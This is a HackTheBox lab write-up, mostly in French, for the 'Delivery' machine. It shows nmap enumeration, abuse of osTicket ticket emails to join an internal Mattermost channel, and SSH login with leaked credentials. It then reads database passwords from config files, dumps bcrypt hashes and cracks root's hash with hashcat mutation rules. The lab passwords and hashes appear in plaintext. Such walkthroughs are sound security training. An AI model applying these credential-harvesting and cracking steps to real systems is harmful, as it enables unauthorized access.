---
title: HTB | Delivery
description: Delivery is an easy difficulty Linux machine that features the support ticketing system osTicket where it is possible by using a technique called TicketTrick, a non-authenticated user to be granted with access to a temporary company email. This "feature" permits the registration at MatterMost and the join of internal team channel. It is revealed through that channel that users have been using same password variant "PleaseSubscribe!" for internal access. In channel it is also disclosed the credentials for the mail user which can give the initial foothold to the system. While enumerating the file system we come across the mattermost configuration file which reveals MySQL database credentials. By having access to the database a password hash can be extracted from Users table and crack it using the "PleaseSubscribe!" pattern. After cracking the hash it is possible to login as user root.
slug: delivery-htb
date: 2025-02-24 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Delivery cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Delivery</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.222</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~/htb/Delivery]
└─$ nmap -sC -sV -An -p- -T4 -vvv 10.10.10.222
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq549E025Q9FR27LDR6WZRQ52ikKjKUQLmE9ndEKjB0i1qOoL+WzkvqTdqEU6fFW6AqUIdSEd7GMNSMOk66otFgSoerK6MmH5IZjy4JqMoNVPDdWfmEiagBlG3H7IZ7yAO8gcg0RRrIQjE7XTMV09GmxEUtjojoLoqudUvbUi8COHCO6baVmyjZRlXRCQ6qTKIxRZbUAo0GOY8bYmf9sMLf70w6u/xbE2EYDFH+w60ES2K906x7lyfEPe73NfAIEhHNL8DBAUfQWzQjVjYNOLqGp/WdlKA1RLAOklpIdJQ9iehsH0q6nqjeTUv47mIHUiqaM+vlkCEAN3AAQH5mB/1
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAiAKnk2lw0GxzzqMXNsPQ1bTk35WwxCa3ED5H34T1yYMiXnRlfssJwso60D34/IM8vYXH0rznR9tHvjdN7R3hY=
|   256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEV5D6eYjySqfhW4l4IF1SZkZHxIRihnY6Mn6D8mLEW7
80/tcp   open  http    syn-ack ttl 63 nginx 1.14.2
|_http-server-header: nginx/1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Welcome
8065/tcp open  unknown syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Fri, 21 Feb 2025 11:56:08 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: 518yfkngnbbmtm9xgi7thkpkdr
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Fri, 21 Feb 2025 12:00:01 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Fri, 21 Feb 2025 12:00:02 GMT
|_    Content-Length: 0
```

## Foothold

### Mattermost / helpdesk.delivery.htb
On peut poster des tickets. Lorsqu'on poste un ticket on nous donne un numero et une email auxquelle on peut ecrire par exemple:
1239870@delivery.htb

On a aussi un serveur "Mattermost" avec une page de login sur lequel on peut créer un compte avec l'email:
1239870@delivery.htb

On nous demande une confirmation. On recoit cette email... directement sur le status du ticket crée précédemment !
```bash
---- Registration Successful ---- Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=49opc49pbwfahgew54koaa699uawqjjxt3xpanuwpte3jgf6etkczaprg8487und&email=1568729%40delivery.htb 
```

### Internal Channel
On obtient un accès a la plateforme après avoir cliqué sur le lien de confirmation. On rejoint l'équipe "internal" qui donnne accès à un channel internal avec des messages !
```bash
root
9:29 AM

@developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail! 
9:30 AM

Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
root
10:58 AM!

PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
```
maildeliverer:Youve_G0t_Mail! 

### maildeliver account: user flag
Il suffit de se connecter en ssh avec les creds de "maildeliver" !
```bash
┌──(kali㉿kali)-[~/htb/Delivery]
└─$ ssh maildeliverer@delivery.htb
maildeliverer@delivery.htb's password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Feb 23 17:28:33 2025 from 10.10.14.3
maildeliverer@Delivery:~$ ls
user.txt
maildeliverer@Delivery:~$ cat user.txt 
fe3d.....c5aa
```

## Privilege Escalation

### DB password
On trouve un fichier avec des creds pour se connecter a la base de données mysql (port 3306):
```bash
maildeliverer@Delivery:/var/www/osticket$ cat upload/include/ost-config.php
<?php
/*********************************************************************
    ost-config.php

...

## Database Options
## ---------------------------------------------------
## Mysql Login info
define('DBTYPE','mysql');
define('DBHOST','localhost');
define('DBNAME','osticket');
define('DBUSER','ost_user');
define('DBPASS','!H3lpD3sk123!');
```

```bash
MariaDB [osticket]> select username,firstname,lastname,passwd,email from ost_staff;
+---------------+-----------+----------+--------------------------------------------------------------+----------------------------+
| username      | firstname | lastname | passwd                                                       | email                      |
+---------------+-----------+----------+--------------------------------------------------------------+----------------------------+
| maildeliverer | Delivery  | Person   | $2a$08$VlccTgoFaxEaGJnZtWwJBOf2EqMW5L1ZLA72QoQN/TrrOJt9mFGcy | maildeliverer@delivery.htb |
+---------------+-----------+----------+--------------------------------------------------------------+----------------------------+
```
On trouve bien qu'il s'agit du même mot de passe qu'en ssh :

```bash
$2a$08$VlccTgoFaxEaGJnZtWwJBOf2EqMW5L1ZLA72QoQN/TrrOJt9mFGcy:Youve_G0t_Mail!
                                                          
Session..........: hashcat
Status...........: Cracked
```
La base de données mysql est donc une fausse piste, ce n'est pas le hash qui nous intéresse

### Mattermost config
En cherchant un peu on trouve le fichier de config de mattermost:
```bash
maildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep user
        "TeammateNameDisplay": "username",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
```
On a donc une nouvelle base de donnée : mattermost
et de nouveaux creds: `mmuser:Crack_The_MM_Admin_PW`

### Récupération des hachages
On trouve tous les hash de password pour mattermost cette fois, ce qui est nettement plus intéressant à première vu:

```bash
MariaDB [mattermost]> select Username,Password from Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| helloguys                        | $2a$10$nX8mrkBf3qoX5hnoxZKg..9SzAx.oVvfCGelMzzebV6Oa2HI8eq0K |
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
| aaaaaa                           | $2a$10$J1d0c.sHFogqV5LoR72JXeFGTQAaAGRVmZJRX1WgyHq/VDiI55..W |
+----------------------------------+--------------------------------------------------------------+
```
### Hashcat best rules - creating password list
On crée une nouvelle liste basée sur le mot clé 'PleaseSubscribe!' comme préciser sur le forum, à l'aide des regles de mutation de mot de passe de hashcat :
```bash
$ echo -e 'PleaseSubscribe!' > base_words.txt
$ hashcat --stdout base_words.txt -r /usr/share/hashcat/rules/best64.rule > mutated_wordlist.txt
```

Il ne reste plus qu'a bruteforcer les hachages avec la liste générée :
```bash
$ hashcat -m 3200 hash.txt ./mutated_wordlist.txt
hashcat (v6.2.5) starting

...

Dictionary cache hit:
* Filename..: ./mutated_wordlist.txt
* Passwords.: 77
* Bytes.....: 1177
* Keyspace..: 77

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
```

### root flag
Il ne reste plus qu'a se connecter avec le mot de passe :
```bash
maildeliverer@Delivery:~$ su - root
Password: 
root@Delivery:~# cat /root/root.txt
eb84.....c688
```